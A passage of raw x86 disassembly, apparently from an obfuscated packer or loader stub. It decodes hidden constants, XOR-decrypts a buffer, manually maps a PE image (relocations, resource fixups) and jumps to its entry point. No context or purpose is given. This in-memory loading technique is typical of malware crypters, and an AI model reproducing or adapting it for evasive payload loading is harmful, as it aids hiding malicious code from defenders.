  4265cd:	sub    eax,ecx
  4265cf:	mov    ecx,DWORD PTR [ebp-0x48]
  4265d2:	xor    ecx,ebx
  4265d4:	add    ecx,esi
  4265d6:	xor    edx,edx
  4265d8:	div    ecx
  4265da:	mov    DWORD PTR [ebp-0x14],eax
  4265dd:	mov    eax,DWORD PTR [ebp-0x20]
  4265e0:	mov    ecx,DWORD PTR [ebp-0x14]
  4265e3:	xor    eax,ebx
  4265e5:	add    eax,esi
  4265e7:	cmp    ecx,eax
  4265e9:	jbe    0x4265f5
  4265eb:	mov    eax,DWORD PTR [ebp-0x20]
  4265ee:	xor    eax,ebx
  4265f0:	add    eax,esi
  4265f2:	mov    DWORD PTR [ebp-0x14],eax
  4265f5:	mov    eax,DWORD PTR [ebp-0x48]
  4265f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4265fb:	xor    eax,ebx
  4265fd:	add    eax,esi
  4265ff:	imul   eax,ecx
  426602:	mov    DWORD PTR [ebp-0x14],eax
  426605:	mov    eax,DWORD PTR [ebp-0x28]
  426608:	mov    ecx,DWORD PTR [ebp-0x14]
  42660b:	xor    eax,ebx
  42660d:	add    eax,esi
  42660f:	cmp    ecx,eax
  426611:	je     0x42677c
  426617:	mov    eax,DWORD PTR [ebp-0x14]
  42661a:	mov    DWORD PTR [ebp-0x34],eax
  42661d:	mov    eax,DWORD PTR [ebp-0xc]
  426620:	add    eax,DWORD PTR [ebp-0x3c]
  426623:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  42662a:	mov    DWORD PTR [ebp-0x14],edi
  42662d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426634:	mov    DWORD PTR [ebp-0x1c],eax
  426637:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42663e:	mov    DWORD PTR [ebp-0x8],edi
  426641:	mov    eax,DWORD PTR [ebp-0x4c]
  426644:	xor    eax,ebx
  426646:	add    eax,esi
  426648:	jmp    0x42673b
  42664d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426657:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426661:	mov    eax,DWORD PTR [ebp-0x8]
  426664:	mov    ecx,DWORD PTR [ebp-0x18]
  426667:	xor    eax,ebx
  426669:	add    eax,esi
  42666b:	imul   eax,ecx
  42666e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426671:	mov    al,BYTE PTR [eax+ecx*1]
  426674:	mov    BYTE PTR [ebp-0x1],al
  426677:	mov    eax,DWORD PTR [ebp-0x8]
  42667a:	mov    ecx,DWORD PTR [ebp-0x18]
  42667d:	xor    eax,ebx
  42667f:	add    eax,esi
  426681:	imul   eax,ecx
  426684:	mov    ecx,DWORD PTR [ebp-0x54]
  426687:	xor    ecx,ebx
  426689:	add    eax,ecx
  42668b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42668e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426696:	mov    ecx,DWORD PTR [ebp-0xe4]
  42669c:	xor    ecx,ebx
  42669e:	lea    eax,[ecx+eax*1+0x3272f1]
  4266a5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4266a9:	xor    ecx,eax
  4266ab:	mov    BYTE PTR [ebp-0x1],cl
  4266ae:	mov    al,BYTE PTR [ebp-0x1]
  4266b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4266b4:	mov    edx,DWORD PTR [ebp-0x18]
  4266b7:	xor    ecx,ebx
  4266b9:	add    ecx,esi
  4266bb:	imul   ecx,edx
  4266be:	mov    edx,DWORD PTR [ebp-0x1c]
  4266c1:	mov    BYTE PTR [ecx+edx*1],al
  4266c4:	mov    eax,DWORD PTR [ebp-0x8]
  4266c7:	mov    ecx,DWORD PTR [ebp-0x18]
  4266ca:	xor    eax,ebx
  4266cc:	add    eax,esi
  4266ce:	imul   eax,ecx
  4266d1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266d4:	mov    al,BYTE PTR [eax+ecx*1]
  4266d7:	mov    BYTE PTR [ebp-0x1],al
  4266da:	mov    eax,DWORD PTR [ebp-0x8]
  4266dd:	mov    ecx,DWORD PTR [ebp-0x18]
  4266e0:	xor    eax,ebx
  4266e2:	add    eax,esi
  4266e4:	imul   eax,ecx
  4266e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4266ea:	xor    ecx,ebx
  4266ec:	add    eax,ecx
  4266ee:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266f1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4266f9:	mov    ecx,DWORD PTR [ebp-0xd0]
  4266ff:	xor    ecx,ebx
  426701:	lea    eax,[ecx+eax*1+0x3272f1]
  426708:	movzx  ecx,BYTE PTR [ebp-0x1]
  42670c:	xor    ecx,eax
  42670e:	mov    BYTE PTR [ebp-0x1],cl
  426711:	mov    al,BYTE PTR [ebp-0x1]
  426714:	mov    ecx,DWORD PTR [ebp-0x8]
  426717:	mov    edx,DWORD PTR [ebp-0x18]
  42671a:	xor    ecx,ebx
  42671c:	add    ecx,esi
  42671e:	imul   ecx,edx
  426721:	mov    edx,DWORD PTR [ebp-0x1c]
  426724:	mov    BYTE PTR [ecx+edx*1],al
  426727:	mov    eax,DWORD PTR [ebp-0x30]
  42672a:	mov    ecx,DWORD PTR [ebp-0x14]
  42672d:	xor    eax,ebx
  42672f:	xor    ecx,ebx
  426731:	add    eax,esi
  426733:	add    ecx,esi
  426735:	imul   eax,ecx
  426738:	add    eax,DWORD PTR [ebp-0x18]
  42673b:	mov    DWORD PTR [ebp-0x18],eax
  42673e:	mov    eax,DWORD PTR [ebp-0x18]
  426741:	mov    ecx,DWORD PTR [ebp-0x34]
  426744:	cmp    ecx,eax
  426746:	jb     0x42664d
  42674c:	mov    eax,DWORD PTR [ebp-0x14]
  42674f:	mov    ecx,DWORD PTR [ebp-0x34]
  426752:	xor    eax,ebx
  426754:	add    eax,esi
  426756:	imul   eax,ecx
  426759:	mov    ecx,DWORD PTR [ebp-0x4c]
  42675c:	xor    ecx,ebx
  42675e:	add    ecx,esi
  426760:	or     eax,ecx
  426762:	mov    ecx,DWORD PTR [ebp-0x2c]
  426765:	xor    ecx,ebx
  426767:	add    eax,ecx
  426769:	mov    ecx,DWORD PTR [ebp-0x2c]
  42676c:	xor    ecx,ebx
  42676e:	add    eax,ecx
  426770:	mov    ecx,DWORD PTR [ebp-0xc]
  426773:	lea    eax,[eax+ecx*1+0x64e5e2]
  42677a:	jmp    0x42678b
  42677c:	mov    eax,DWORD PTR [ebp-0x2c]
  42677f:	mov    ecx,DWORD PTR [ebp-0xc]
  426782:	xor    eax,ebx
  426784:	lea    eax,[eax+ecx*1+0x3272f1]
  42678b:	mov    DWORD PTR [ebp-0xc],eax
  42678e:	mov    eax,DWORD PTR [ebp-0x2c]
  426791:	xor    eax,ebx
  426793:	mov    ecx,0xffcd8d0f
  426798:	sub    ecx,eax
  42679a:	add    ecx,DWORD PTR [ebp-0x38]
  42679d:	mov    eax,DWORD PTR [ebp-0x2c]
  4267a0:	mov    edx,DWORD PTR [ebp-0xc]
  4267a3:	xor    eax,ebx
  4267a5:	add    eax,esi
  4267a7:	imul   eax,edx
  4267aa:	cmp    eax,ecx
  4267ac:	jbe    0x4265c7
  4267b2:	push   DWORD PTR [ebp+0x8]
  4267b5:	mov    eax,DWORD PTR [ebp+0x8]
  4267b8:	push   DWORD PTR [eax+0x1cc]
  4267be:	lea    eax,[ebp-0xd8]
  4267c4:	push   eax
  4267c5:	mov    eax,DWORD PTR [ebp+0x8]
  4267c8:	mov    eax,DWORD PTR [eax+0x1c4]
  4267ce:	push   DWORD PTR [eax]
  4267d0:	mov    eax,DWORD PTR [ebp+0x8]
  4267d3:	mov    eax,DWORD PTR [eax+0x1c0]
  4267d9:	push   DWORD PTR [eax]
  4267db:	push   DWORD PTR [ebp-0x40]
  4267de:	push   DWORD PTR [ebp-0x24]
  4267e1:	call   0x427278
  4267e6:	mov    DWORD PTR [ebp-0x3c],eax
  4267e9:	mov    eax,DWORD PTR [ebp-0x10]
  4267ec:	mov    ecx,DWORD PTR [ebp-0x24]
  4267ef:	xor    eax,ebx
  4267f1:	add    eax,esi
  4267f3:	cmp    eax,ecx
  4267f5:	je     0x426816
  4267f7:	mov    eax,DWORD PTR [ebp+0x8]
  4267fa:	mov    ecx,DWORD PTR [ebp-0x50]
  4267fd:	mov    eax,DWORD PTR [eax+0x1e0]
  426803:	xor    ecx,ebx
  426805:	add    ecx,esi
  426807:	push   ecx
  426808:	mov    ecx,DWORD PTR [ebp-0x10]
  42680b:	xor    ecx,ebx
  42680d:	add    ecx,esi
  42680f:	push   ecx
  426810:	push   DWORD PTR [ebp-0x24]
  426813:	call   DWORD PTR [eax+0x18]
  426816:	pop    edi
  426817:	pop    esi
  426818:	pop    ebx
  426819:	leave  
  42681a:	ret    0x4
  42681d:	push   ebp
  42681e:	mov    ebp,esp
  426820:	push   ecx
  426821:	push   ecx
  426822:	lea    eax,[ebp-0x8]
  426825:	mov    DWORD PTR [ebp-0x4],eax
  426828:	push   esi
  426829:	mov    esi,DWORD PTR [ebp-0x4]
  42682c:	mov    eax,0xf881ba2f
  426831:	mov    DWORD PTR [esi],eax
  426833:	mov    esi,DWORD PTR [ebp-0x8]
  426836:	cmp    esi,eax
  426838:	pop    esi
  426839:	jne    0x426843
  42683b:	mov    BYTE PTR [ecx+0xa],0x83
  42683f:	mov    BYTE PTR [edx+0x8],0x2e
  426843:	mov    BYTE PTR [edx+0xa],0x83
  426847:	mov    BYTE PTR [ecx+0x2],0x11
  42684b:	leave  
  42684c:	ret    
  42684d:	push   ebp
  42684e:	mov    ebp,esp
  426850:	push   ecx
  426851:	push   ecx
  426852:	lea    eax,[ebp-0x8]
  426855:	mov    DWORD PTR [ebp-0x4],eax
  426858:	mov    edx,DWORD PTR [ebp-0x4]
  42685b:	mov    eax,0xf88b0bc3
  426860:	mov    DWORD PTR [edx],eax
  426862:	mov    edx,DWORD PTR [ebp-0x8]
  426865:	cmp    edx,eax
  426867:	jne    0x426878
  426869:	mov    eax,DWORD PTR [ebp+0x8]
  42686c:	mov    BYTE PTR [ecx+0x9],0xf
  426870:	mov    BYTE PTR [eax+0x7],0x56
  426874:	mov    BYTE PTR [ecx+0x6],0xe
  426878:	mov    BYTE PTR [ecx+0x3],0x1f
  42687c:	leave  
  42687d:	ret    0x4
  426880:	push   ebp
  426881:	mov    ebp,esp
  426883:	push   ecx
  426884:	push   ecx
  426885:	lea    eax,[ebp-0x8]
  426888:	mov    DWORD PTR [ebp-0x4],eax
  42688b:	mov    edx,DWORD PTR [ebp-0x4]
  42688e:	mov    eax,0x7e0da2f
  426893:	mov    DWORD PTR [edx],eax
  426895:	mov    edx,DWORD PTR [ebp-0x8]
  426898:	cmp    edx,eax
  42689a:	jne    0x4268a0
  42689c:	mov    BYTE PTR [ecx+0x7],0x56
  4268a0:	mov    eax,DWORD PTR [ebp+0x8]
  4268a3:	mov    BYTE PTR [ecx+0x1],0x14
  4268a7:	mov    BYTE PTR [eax+0x9],0x2f
  4268ab:	leave  
  4268ac:	ret    0x4
  4268af:	push   ebp
  4268b0:	mov    ebp,esp
  4268b2:	push   ecx
  4268b3:	push   ecx
  4268b4:	lea    eax,[ebp-0x8]
  4268b7:	mov    DWORD PTR [ebp-0x4],eax
  4268ba:	push   esi
  4268bb:	mov    esi,DWORD PTR [ebp-0x4]
  4268be:	mov    eax,0x7060e3c
  4268c3:	mov    DWORD PTR [esi],eax
  4268c5:	mov    esi,DWORD PTR [ebp-0x8]
  4268c8:	cmp    esi,eax
  4268ca:	pop    esi
  4268cb:	jne    0x4268d7
  4268cd:	mov    BYTE PTR [edx+0x4],0x12
  4268d1:	mov    WORD PTR [ecx+0x3],0x121f
  4268d7:	mov    BYTE PTR [edx],0x3e
  4268da:	leave  
  4268db:	ret    
  4268dc:	push   ebp
  4268dd:	mov    ebp,esp
  4268df:	push   ecx
  4268e0:	push   ecx
  4268e1:	lea    eax,[ebp-0x8]
  4268e4:	mov    DWORD PTR [ebp-0x4],eax
  4268e7:	mov    edx,DWORD PTR [ebp-0x4]
  4268ea:	mov    eax,0xf8870b3f
  4268ef:	mov    DWORD PTR [edx],eax
  4268f1:	mov    edx,DWORD PTR [ebp-0x8]
  4268f4:	cmp    edx,eax
  4268f6:	jne    0x426903
  4268f8:	mov    eax,DWORD PTR [ebp+0x8]
  4268fb:	mov    BYTE PTR [ecx+0x8],0xe
  4268ff:	mov    BYTE PTR [eax+0x1],0x14
  426903:	mov    BYTE PTR [ecx+0x5],0xa
  426907:	leave  
  426908:	ret    0x4
  42690b:	push   esi
  42690c:	mov    ecx,edi
  42690e:	call   0x4268dc
  426913:	mov    edx,edi
  426915:	mov    ecx,esi
  426917:	mov    BYTE PTR [esi],0x1e
  42691a:	call   0x4268af
  42691f:	push   esi
  426920:	mov    ecx,edi
  426922:	mov    BYTE PTR [esi+0x5],0xa
  426926:	call   0x426880
  42692b:	push   esi
  42692c:	mov    BYTE PTR [esi+0x6],0xe
  426930:	call   0x42684d
  426935:	mov    BYTE PTR [esi+0x2],0x11
  426939:	mov    edx,esi
  42693b:	jmp    0x42681d
  426940:	push   ebp
  426941:	mov    ebp,esp
  426943:	push   ecx
  426944:	mov    ecx,DWORD PTR [edx+0x194]
  42694a:	push   esi
  42694b:	mov    esi,DWORD PTR [ebp+0x8]
  42694e:	mov    esi,DWORD PTR [esi]
  426950:	mov    DWORD PTR [ecx],esi
  426952:	mov    ecx,DWORD PTR [edx+0x194]
  426958:	mov    ecx,DWORD PTR [ecx]
  42695a:	mov    esi,DWORD PTR [edx+0x190]
  426960:	mov    DWORD PTR [esi],ecx
  426962:	mov    eax,DWORD PTR [edx+0x194]
  426968:	mov    ecx,DWORD PTR [eax]
  42696a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42696d:	add    ecx,DWORD PTR [eax]
  42696f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426976:	mov    eax,DWORD PTR [ebp-0x4]
  426979:	movzx  ecx,WORD PTR [ecx+0x16]
  42697d:	xor    eax,0x75108aa
  426982:	add    eax,0x3272f1
  426987:	pop    esi
  426988:	test   ecx,eax
  42698a:	je     0x426998
  42698c:	mov    eax,DWORD PTR [edx+0x1c8]
  426992:	mov    DWORD PTR [eax],0xf89c85ba
  426998:	leave  
  426999:	ret    0x4
  42699c:	push   ebp
  42699d:	mov    ebp,esp
  42699f:	sub    esp,0x70
  4269a2:	and    DWORD PTR [ebp-0x20],0x0
  4269a6:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  4269ad:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  4269b4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4269bb:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4269c2:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  4269c9:	mov    eax,DWORD PTR [ebp+0x20]
  4269cc:	mov    eax,DWORD PTR [eax+0x194]
  4269d2:	mov    DWORD PTR [ebp-0xc],eax
  4269d5:	mov    eax,DWORD PTR [ebp+0x20]
  4269d8:	push   ebx
  4269d9:	push   esi
  4269da:	mov    esi,DWORD PTR [eax+0x190]
  4269e0:	mov    eax,DWORD PTR [ebp+0x20]
  4269e3:	mov    eax,DWORD PTR [eax+0x18c]
  4269e9:	mov    DWORD PTR [ebp-0x8],eax
  4269ec:	mov    eax,DWORD PTR [eax]
  4269ee:	push   edi
  4269ef:	mov    DWORD PTR [ebp-0x4],esi
  4269f2:	test   eax,eax
  4269f4:	jne    0x426a01
  4269f6:	push   DWORD PTR [ebp+0x1c]
  4269f9:	mov    edx,DWORD PTR [ebp+0x20]
  4269fc:	call   0x426940
  426a01:	mov    eax,DWORD PTR [esi]
  426a03:	mov    ebx,DWORD PTR [esi]
  426a05:	add    ebx,DWORD PTR [eax+0x3c]
  426a08:	mov    eax,DWORD PTR [ebp+0xc]
  426a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  426a0e:	mov    ecx,DWORD PTR [ecx]
  426a10:	mov    esi,0x75108aa
  426a15:	xor    eax,esi
  426a17:	mov    edi,0x3272f1
  426a1c:	add    eax,edi
  426a1e:	cmp    eax,ecx
  426a20:	jne    0x426c58
  426a26:	mov    eax,DWORD PTR [ebp-0xc]
  426a29:	mov    eax,DWORD PTR [eax]
  426a2b:	mov    DWORD PTR [ebp-0x10],eax
  426a2e:	mov    eax,DWORD PTR [ebx+0x50]
  426a31:	mov    DWORD PTR [ebp-0x68],eax
  426a34:	mov    eax,DWORD PTR [ebp-0x18]
  426a37:	xor    eax,esi
  426a39:	add    eax,edi
  426a3b:	mov    DWORD PTR [ebp-0x64],eax
  426a3e:	mov    eax,DWORD PTR [ebp-0x14]
  426a41:	and    DWORD PTR [ebp-0x6c],0x0
  426a45:	xor    eax,esi
  426a47:	add    eax,edi
  426a49:	mov    DWORD PTR [ebp-0x60],eax
  426a4c:	lea    eax,[ebp-0x70]
  426a4f:	push   eax
  426a50:	mov    eax,DWORD PTR [ebp+0x8]
  426a53:	xor    eax,esi
  426a55:	add    eax,edi
  426a57:	push   eax
  426a58:	mov    eax,DWORD PTR [ebp+0x20]
  426a5b:	add    eax,0xaa
  426a60:	push   eax
  426a61:	mov    eax,DWORD PTR [ebp+0x20]
  426a64:	mov    eax,DWORD PTR [eax+0x198]
  426a6a:	mov    DWORD PTR [ebp-0x70],0x4
  426a71:	push   DWORD PTR [eax]
  426a73:	mov    eax,DWORD PTR [ebp+0x10]
  426a76:	call   eax
  426a78:	mov    ecx,DWORD PTR [ebp-0xc]
  426a7b:	mov    ecx,DWORD PTR [ecx]
  426a7d:	mov    edx,DWORD PTR [ebp-0x8]
  426a80:	mov    DWORD PTR [ebp-0x6c],eax
  426a83:	mov    DWORD PTR [ebp+0x1c],eax
  426a86:	mov    DWORD PTR [edx],ecx
  426a88:	mov    ecx,DWORD PTR [ebp-0x4]
  426a8b:	mov    DWORD PTR [ecx],eax
  426a8d:	mov    eax,DWORD PTR [ebx+0x50]
  426a90:	mov    DWORD PTR [ebp-0x68],eax
  426a93:	mov    eax,DWORD PTR [ebp-0x1c]
  426a96:	xor    eax,esi
  426a98:	add    eax,edi
  426a9a:	mov    DWORD PTR [ebp-0x64],eax
  426a9d:	lea    eax,[ebp-0x20]
  426aa0:	mov    DWORD PTR [ebp-0x60],eax
  426aa3:	lea    eax,[ebp-0x70]
  426aa6:	push   eax
  426aa7:	mov    eax,DWORD PTR [ebp+0x8]
  426aaa:	xor    eax,esi
  426aac:	add    eax,edi
  426aae:	push   eax
  426aaf:	mov    eax,DWORD PTR [ebp+0x20]
  426ab2:	add    eax,0xee
  426ab7:	push   eax
  426ab8:	mov    eax,DWORD PTR [ebp+0x20]
  426abb:	mov    eax,DWORD PTR [eax+0x198]
  426ac1:	mov    DWORD PTR [ebp-0x70],0x4
  426ac8:	push   DWORD PTR [eax]
  426aca:	mov    eax,DWORD PTR [ebp+0x10]
  426acd:	call   eax
  426acf:	test   eax,eax
  426ad1:	je     0x426af6
  426ad3:	and    DWORD PTR [ebp+0xc],0x0
  426ad7:	cmp    DWORD PTR [ebx+0x50],0x0
  426adb:	jbe    0x426af6
  426add:	mov    eax,DWORD PTR [ebp+0x1c]
  426ae0:	mov    ecx,DWORD PTR [ebp-0x10]
  426ae3:	sub    ecx,eax
  426ae5:	mov    dl,BYTE PTR [ecx+eax*1]
  426ae8:	inc    DWORD PTR [ebp+0xc]
  426aeb:	mov    BYTE PTR [eax],dl
  426aed:	mov    edx,DWORD PTR [ebp+0xc]
  426af0:	inc    eax
  426af1:	cmp    edx,DWORD PTR [ebx+0x50]
  426af4:	jb     0x426ae5
  426af6:	mov    edx,DWORD PTR [ebp+0x1c]
  426af9:	mov    ecx,DWORD PTR [edx+0x3c]
  426afc:	add    ecx,edx
  426afe:	mov    eax,DWORD PTR [ecx+0xa0]
  426b04:	mov    ebx,DWORD PTR [ecx+0x28]
  426b07:	add    eax,edx
  426b09:	sub    edx,DWORD PTR [ebp-0x10]
  426b0c:	add    ebx,DWORD PTR [ebp+0x1c]
  426b0f:	mov    DWORD PTR [ebp+0xc],edx
  426b12:	mov    DWORD PTR [ebp-0x2c],ecx
  426b15:	mov    DWORD PTR [ebp-0x14],ebx
  426b18:	mov    DWORD PTR [ebp-0x8],0x0
  426b1f:	jmp    0x426b9b
  426b21:	add    edx,0xfffffff8
  426b24:	shr    edx,1
  426b26:	mov    DWORD PTR [ebp-0x18],edx
  426b29:	je     0x426b87
  426b2b:	lea    edx,[eax+0x8]
  426b2e:	mov    DWORD PTR [ebp-0x4],edx
  426b31:	mov    edx,DWORD PTR [ebp-0x18]
  426b34:	mov    DWORD PTR [ebp-0x18],edx
  426b37:	mov    edx,DWORD PTR [ebp-0x4]
  426b3a:	movzx  edx,WORD PTR [edx]
  426b3d:	mov    DWORD PTR [ebp-0x24],edx
  426b40:	and    edx,0xfff
  426b46:	mov    DWORD PTR [ebp-0x28],edx
  426b49:	mov    edx,DWORD PTR [ebp-0x24]
  426b4c:	shr    edx,0xc
  426b4f:	add    edx,0xffcd8d0f
  426b55:	xor    edx,esi
  426b57:	cmp    edx,0xf89c85b8
  426b5d:	jne    0x426b7e
  426b5f:	mov    edx,DWORD PTR [ebp-0x28]
  426b62:	add    edx,DWORD PTR [ebp+0x1c]
  426b65:	mov    ebx,DWORD PTR [eax]
  426b67:	cmp    DWORD PTR [ebx+edx*1],0x0
  426b6b:	je     0x426b7b
  426b6d:	mov    ecx,DWORD PTR [ebp+0xc]
  426b70:	add    ecx,DWORD PTR [ebx+edx*1]
  426b73:	mov    ebx,DWORD PTR [eax]
  426b75:	mov    DWORD PTR [edx+ebx*1],ecx
  426b78:	mov    ecx,DWORD PTR [ebp-0x2c]
  426b7b:	mov    ebx,DWORD PTR [ebp-0x14]
  426b7e:	add    DWORD PTR [ebp-0x4],0x2
  426b82:	dec    DWORD PTR [ebp-0x18]
  426b85:	jne    0x426b37
  426b87:	mov    edx,DWORD PTR [ebp-0xc]
  426b8a:	add    DWORD PTR [ebp-0x8],edx
  426b8d:	mov    edx,DWORD PTR [ebp-0x8]
  426b90:	cmp    edx,DWORD PTR [ecx+0xa4]
  426b96:	jae    0x426ba9
  426b98:	add    eax,DWORD PTR [ebp-0xc]
  426b9b:	mov    edx,DWORD PTR [eax+0x4]
  426b9e:	mov    DWORD PTR [ebp-0xc],edx
  426ba1:	test   edx,edx
  426ba3:	jne    0x426b21
  426ba9:	mov    eax,DWORD PTR [ebp-0x10]
  426bac:	mov    DWORD PTR [ebp-0x6c],eax
  426baf:	mov    DWORD PTR [ebp-0x70],0x4
  426bb6:	mov    eax,DWORD PTR [ecx+0x50]
  426bb9:	mov    DWORD PTR [ebp-0x68],eax
  426bbc:	mov    eax,DWORD PTR [ebp-0x1c]
  426bbf:	xor    eax,esi
  426bc1:	add    eax,edi
  426bc3:	mov    DWORD PTR [ebp-0x64],eax
  426bc6:	lea    eax,[ebp-0x20]
  426bc9:	mov    DWORD PTR [ebp-0x60],eax
  426bcc:	lea    eax,[ebp-0x70]
  426bcf:	push   eax
  426bd0:	mov    eax,DWORD PTR [ebp+0x8]
  426bd3:	xor    eax,esi
  426bd5:	add    eax,edi
  426bd7:	push   eax
  426bd8:	mov    eax,DWORD PTR [ebp+0x20]
  426bdb:	add    eax,0xee
  426be0:	push   eax
  426be1:	mov    eax,DWORD PTR [ebp+0x20]
  426be4:	mov    eax,DWORD PTR [eax+0x198]
  426bea:	push   DWORD PTR [eax]
  426bec:	mov    eax,DWORD PTR [ebp+0x10]
  426bef:	call   eax
  426bf1:	mov    eax,DWORD PTR [ebp+0x20]
  426bf4:	mov    eax,DWORD PTR [eax+0x180]
  426bfa:	add    eax,DWORD PTR [ebp+0xc]
  426bfd:	mov    ecx,DWORD PTR [ebp+0xc]
  426c00:	push   DWORD PTR [ebp+0x18]
  426c03:	mov    DWORD PTR [eax],ecx
  426c05:	push   DWORD PTR [ebp+0x14]
  426c08:	push   DWORD PTR [ebp+0x1c]
  426c0b:	call   ebx
  426c0d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c10:	add    ecx,DWORD PTR [ebp+0x20]
  426c13:	lea    eax,[ebp+0x4]
  426c16:	mov    DWORD PTR [ebp+0x20],ecx
  426c19:	mov    ecx,DWORD PTR [ebp+0x20]
  426c1c:	mov    ecx,DWORD PTR [ebp+0x20]
  426c1f:	mov    edx,DWORD PTR [ecx+0x190]
  426c25:	mov    ecx,DWORD PTR [ebp+0x20]
  426c28:	mov    ecx,DWORD PTR [ecx+0x18c]
  426c2e:	mov    esi,DWORD PTR [ecx]
  426c30:	cmp    DWORD PTR [eax],esi
  426c32:	jb     0x426c53
  426c34:	mov    esi,DWORD PTR [edx]
  426c36:	mov    edi,DWORD PTR [edx]
  426c38:	mov    esi,DWORD PTR [esi+0x3c]
  426c3b:	lea    esi,[edi+esi*1+0x50]
  426c3f:	mov    edi,DWORD PTR [ecx]
  426c41:	add    edi,DWORD PTR [esi]
  426c43:	cmp    DWORD PTR [eax],edi
  426c45:	jae    0x426c53
  426c47:	mov    esi,DWORD PTR [ecx]
  426c49:	mov    ecx,DWORD PTR [eax]
  426c4b:	mov    edx,DWORD PTR [edx]
  426c4d:	sub    ecx,esi
  426c4f:	add    edx,ecx
  426c51:	mov    DWORD PTR [eax],edx
  426c53:	mov    eax,DWORD PTR [ebp+0xc]
  426c56:	jmp    0x426c5a
  426c58:	xor    eax,eax
  426c5a:	pop    edi
  426c5b:	pop    esi
  426c5c:	pop    ebx
  426c5d:	leave  
  426c5e:	ret    0x1c
  426c61:	push   ebp
  426c62:	mov    ebp,esp
  426c64:	sub    esp,0x1c
  426c67:	push   esi
  426c68:	mov    esi,eax
  426c6a:	mov    eax,DWORD PTR [ecx+0x190]
  426c70:	cmp    DWORD PTR [eax],0x0
  426c73:	je     0x426d83
  426c79:	test   edx,edx
  426c7b:	je     0x426d83
  426c81:	test   esi,esi
  426c83:	je     0x426d83
  426c89:	mov    eax,DWORD PTR [esi+0x88]
  426c8f:	test   eax,eax
  426c91:	je     0x426d7e
  426c97:	cmp    DWORD PTR [esi+0x8c],0x10
  426c9e:	je     0x426d7e
  426ca4:	cmp    DWORD PTR [esi+0x34],edx
  426ca7:	je     0x426d7e
  426cad:	mov    esi,DWORD PTR [ecx+0x18c]
  426cb3:	and    DWORD PTR [ebp-0x10],0x0
  426cb7:	mov    ecx,edx
  426cb9:	sub    ecx,DWORD PTR [esi]
  426cbb:	add    eax,edx
  426cbd:	movzx  edx,WORD PTR [eax+0xc]
  426cc1:	mov    DWORD PTR [ebp-0x1c],ecx
  426cc4:	movzx  ecx,WORD PTR [eax+0xe]
  426cc8:	add    ecx,edx
  426cca:	je     0x426d7e
  426cd0:	lea    ecx,[eax+0x14]
  426cd3:	push   ebx
  426cd4:	mov    DWORD PTR [ebp-0x18],ecx
  426cd7:	mov    esi,0x7fffffff
  426cdc:	push   edi
  426cdd:	test   DWORD PTR [ecx],esi
  426cdf:	je     0x426d60
  426ce1:	mov    edx,DWORD PTR [ecx]
  426ce3:	and    DWORD PTR [ebp-0xc],0x0
  426ce7:	and    edx,esi
  426ce9:	add    edx,eax
  426ceb:	movzx  edi,WORD PTR [edx+0xe]
  426cef:	movzx  ebx,WORD PTR [edx+0xc]
  426cf3:	add    edi,ebx
  426cf5:	je     0x426d60
  426cf7:	lea    ecx,[edx+0x14]
  426cfa:	mov    DWORD PTR [ebp-0x14],ecx
  426cfd:	test   DWORD PTR [ecx],esi
  426cff:	je     0x426d42
  426d01:	mov    ecx,DWORD PTR [ecx]
  426d03:	and    DWORD PTR [ebp-0x8],0x0
  426d07:	and    ecx,esi
  426d09:	add    ecx,eax
  426d0b:	movzx  edi,WORD PTR [ecx+0xe]
  426d0f:	movzx  ebx,WORD PTR [ecx+0xc]
  426d13:	add    edi,ebx
  426d15:	je     0x426d42
  426d17:	lea    edi,[ecx+0x14]
  426d1a:	mov    DWORD PTR [ebp-0x4],edi
  426d1d:	mov    edi,DWORD PTR [ebp-0x4]
  426d20:	mov    edi,DWORD PTR [edi]
  426d22:	test   edi,edi
  426d24:	je     0x426d2c
  426d26:	mov    ebx,DWORD PTR [ebp-0x1c]
  426d29:	add    DWORD PTR [edi+eax*1],ebx
  426d2c:	movzx  edi,WORD PTR [ecx+0xe]
  426d30:	movzx  ebx,WORD PTR [ecx+0xc]
  426d34:	inc    DWORD PTR [ebp-0x8]
  426d37:	add    DWORD PTR [ebp-0x4],0x8
  426d3b:	add    edi,ebx
  426d3d:	cmp    DWORD PTR [ebp-0x8],edi
  426d40:	jb     0x426d1d
  426d42:	movzx  edi,WORD PTR [edx+0xe]
  426d46:	movzx  ebx,WORD PTR [edx+0xc]
  426d4a:	mov    ecx,DWORD PTR [ebp-0x14]
  426d4d:	inc    DWORD PTR [ebp-0xc]
  426d50:	add    ecx,0x8
  426d53:	add    edi,ebx
  426d55:	mov    DWORD PTR [ebp-0x14],ecx
  426d58:	cmp    DWORD PTR [ebp-0xc],edi
  426d5b:	jb     0x426cfd
  426d5d:	mov    ecx,DWORD PTR [ebp-0x18]
  426d60:	movzx  edx,WORD PTR [eax+0xe]
  426d64:	movzx  edi,WORD PTR [eax+0xc]
  426d68:	inc    DWORD PTR [ebp-0x10]
  426d6b:	add    ecx,0x8
  426d6e:	add    edx,edi
  426d70:	mov    DWORD PTR [ebp-0x18],ecx
  426d73:	cmp    DWORD PTR [ebp-0x10],edx
  426d76:	jb     0x426cdd
  426d7c:	pop    edi
  426d7d:	pop    ebx
  426d7e:	xor    eax,eax
  426d80:	inc    eax
  426d81:	jmp    0x426d85
  426d83:	xor    eax,eax
  426d85:	pop    esi
  426d86:	leave  
